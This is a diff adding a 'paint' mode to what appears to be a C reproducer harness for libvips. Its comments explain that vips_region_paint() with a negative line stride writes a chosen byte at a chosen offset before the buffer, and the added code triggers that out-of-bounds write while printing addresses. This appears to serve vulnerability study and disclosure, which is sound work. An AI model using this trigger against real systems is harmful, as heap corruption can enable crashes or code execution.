@@ -85,6 +85,44 @@ main(int argc, char **argv)
 		}
 		g_object_unref(reg);
 	}
+	else if (!strcmp(mode, "paint")) {
+		/* vips_region_paint() is a public API. For an int image it
+		 * memsets each line at VIPS_REGION_ADDR(reg,x,y) and advances
+		 * by VIPS_REGION_LSKIP (region.c:922-923). With bpl=-7296 the
+		 * second line lands before the real allocation, so the second
+		 * memset writes a chosen value at a chosen negative offset.
+		 */
+		VipsRegion *reg = vips_region_new(im);
+		VipsRect r;
+		int rc;
+
+		r.left = 0;
+		r.top = 0;
+		r.width = 4;
+		r.height = 2;
+		rc = vips_region_prepare(reg, &r);
+		printf("PAINT_PREPARE=%d data=%p bpl=%d lskip=%llu "
+			"valid={%d,%d,%d,%d} msg=%s\n",
+			rc, (void *) reg->data, reg->bpl,
+			(unsigned long long) VIPS_REGION_LSKIP(reg),
+			reg->valid.left, reg->valid.top,
+			reg->valid.width, reg->valid.height, vips_error_buffer());
+		vips_error_clear();
+		fflush(stdout);
+		if (rc == 0 && reg->valid.height >= 2) {
+			printf("PAINT_CALL value=0x5a wd=%" G_GUINT64_FORMAT "\n",
+				(guint64) (4 * VIPS_IMAGE_SIZEOF_PEL(im)));
+			fflush(stdout);
+			printf("PAINT_ADDR0=%p ADDR1=%p\n",
+				(void *) VIPS_REGION_ADDR(reg, 0, 0),
+				(void *) VIPS_REGION_ADDR(reg, 0, 1));
+			fflush(stdout);
+			vips_region_paint(reg, &r, 0x5a);
+			printf("PAINT_DONE\n");
+			fflush(stdout);
+		}
+		g_object_unref(reg);
+	}
 	else if (!strcmp(mode, "extract")) {
 		VipsImage *out = NULL;
 		void *buf;
